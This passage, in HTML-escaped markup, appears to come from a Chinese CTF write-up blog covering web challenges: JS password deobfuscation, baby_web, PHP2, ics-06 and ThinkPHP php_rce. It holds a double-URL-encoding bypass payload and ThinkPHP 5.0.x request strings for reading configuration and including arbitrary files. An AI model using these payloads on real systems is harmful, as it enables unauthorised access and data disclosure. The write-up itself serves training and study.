punctuation&#34;&gt;;&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tab&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;length&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        k &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; j &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;l&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tab2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;length&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;o&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;k &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; i&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;o &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tab&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;l&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;p &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; String&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;fromCharCode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;o &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tab2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;o&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;k &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; i&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        o &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tab&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;l&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; k&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                        p &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; String&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;fromCharCode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;o &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tab2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        p &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; String&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;fromCharCode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;tab2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;      &lt;span class=&#34;token comment&#34;&gt;// 这里只返回了部分字符&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        pass &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; pass&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    String&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;fromCharCode&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;dechiffre&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;// 需要对比的密码&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    h &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;prompt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Enter password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dechiffre&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;h&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
&lt;p&gt;pass_enc**.split (**) 方法用于把一个字符串分割成字符串数组&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# ascii 转字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hex_string &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;r&#34;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hex_values &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; hex_string&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;r&#39;\x&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hex_value&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; hex_value &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; hex_values&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ascii_values &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;55&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;56&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;54&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;79&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;69&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;107&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;49&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; value &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; ascii_values&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#55,56,54,79,115,69,114,116,107,49,50&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#786OsErtk12&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote 786OsErtk12=&#34;&#34;&gt;
&lt;p&gt;flag&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;baby_web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#baby_web&#34;&gt;#&lt;/a&gt; baby_web:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824221304273.png&#34; alt=&#34;image-20230824221304273&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824221335028.png&#34; alt=&#34;image-20230824221335028&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入题目页面。初始页面一般是 index.php&lt;/p&gt;
&lt;p&gt;试着传入 index.php 试一下&lt;/p&gt;
&lt;p&gt;但是又回到 1.php&lt;/p&gt;
&lt;p&gt;用 burp 传一下试一下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824221652725.png&#34; alt=&#34;image-20230824221652725&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功找到 flag&lt;/p&gt;
&lt;h2 id=&#34;php2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php2&#34;&gt;#&lt;/a&gt; PHP2:&amp;gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;前置知识：&lt;/p&gt;
&lt;p&gt;phps 即为 PHP Source。&lt;/p&gt;
&lt;p&gt;phps 文件就是 php 的源代码文件，通常用于提供给用户（访问者）查看 php 代码，因为用户无法直接通过 Web 浏览器看到 php 文件的内容，所以需要用 phps 文件代替。其实，只要不用 php 等已经在服务器中注册过的 MIME 类型为文件即可，但为了国际通用，所以才用了 phps 文件类型&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这题 php 查看不了源码，只能用 phps 查看。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824222125570.png&#34; alt=&#34;image-20230824222125570&#34;&gt;&lt;/p&gt;
&lt;p&gt;有点乱，用 burp 看一眼。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824222253677.png&#34; alt=&#34;image-20230824222253677&#34;&gt;&lt;/p&gt;
&lt;p&gt;大概意思就是，GET 请求，如果 admin 等于传入的 id 在退出，但是下面可以通过 url 解码去绕过&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1, 只改变 a 即 %61dmin&lt;/p&gt;
&lt;p&gt;2, 全都改变 %61%64%6d%69%6e&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;但是，进入网页可要 url 解码一次，所以 % 要改变 %25&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;即最终的 payload 的为：?id=%2561%2564%256d%2569%256e&lt;/p&gt;
&lt;p&gt;​				   			or   ?id=%2561dmin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824223440837.png&#34; alt=&#34;image-20230824223440837&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ics-06&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ics-06&#34;&gt;#&lt;/a&gt; ics-06:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824223657576.png&#34; alt=&#34;image-20230824223657576&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824223722948.png&#34; alt=&#34;image-20230824223722948&#34;&gt;&lt;/p&gt;
&lt;p&gt;只有报表中心可以点&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824223808888.png&#34; alt=&#34;image-20230824223808888&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现有 GET 传 id 的方式&lt;/p&gt;
&lt;p&gt;用 burp 抓下包看一下。（没有别的发现，只能对 id 爆破&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824224221045.png&#34; alt=&#34;image-20230824224221045&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里添加 payload。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824224258586.png&#34; alt=&#34;image-20230824224258586&#34;&gt;&lt;/p&gt;
&lt;p&gt;这样设置 payload，攻击！！&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824224459083.png&#34; alt=&#34;image-20230824224459083&#34;&gt;&lt;/p&gt;
&lt;p&gt;id=2333 异常。说明入侵者痕迹在这。&lt;/p&gt;
&lt;p&gt;查看响应包。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824224825879.png&#34; alt=&#34;image-20230824224825879&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现 flag&lt;/p&gt;
&lt;h2 id=&#34;php_rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php_rce&#34;&gt;#&lt;/a&gt; php_rce:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824225156637.png&#34; alt=&#34;image-20230824225156637&#34;&gt;&lt;/p&gt;
&lt;p&gt;知识了解一下吧：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1.ThinkPHP 简介：&lt;br&gt;
ThinkPHP 是一个开源，快速、简单的轻量级国产 PHP 开发框架，诞生于 2006 年初，原名 FCS，2007 年元旦正式更名为 ThinkPHP。使用面向对象的开发结构和 MVC 模式，融合了 Struts 的思想和 TagLib（标签库）、RoR 的 ORM 映射和 ActiveRecord 模式。&lt;/p&gt;
&lt;p&gt;ThinkPHP 可以支持 windows/Unix/Linux 等服务器环境，正式版需要 PHP 5.0 以上版本，支持 MySql、PgSQL、Sqlite 多种数据库以及 PDO 扩展，是一款跨平台，跨版本以及简单易用的 PHP 框架。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其中 ThinkPHP 2 以及 ThinkPHP 3 系列已经停止维护，ThinkPHP 5 系列现使用最多，而 ThinkPHP 3 系列也积累了较多的历史用户。各个系列之间在代码实现及功能方面有较大区别。&lt;/p&gt;
&lt;p&gt;这是 PHP V5，找下 PHP V5 的漏洞。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;5.0.x：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight web-idl&#34;&gt;&lt;figcaption data-lang=&#34;web-idl&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;s&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index/think\config/get&amp;amp;name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;database&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username &lt;span class=&#34;token comment&#34;&gt;// 获取配置信息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;s&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index/\think\Lang/load&amp;amp;file&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;/&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;/test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;jpg &lt;span class=&#34;token comment&#34;&gt;// 包含任意文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;s&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index/\think\Config/load&amp;amp;file&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token 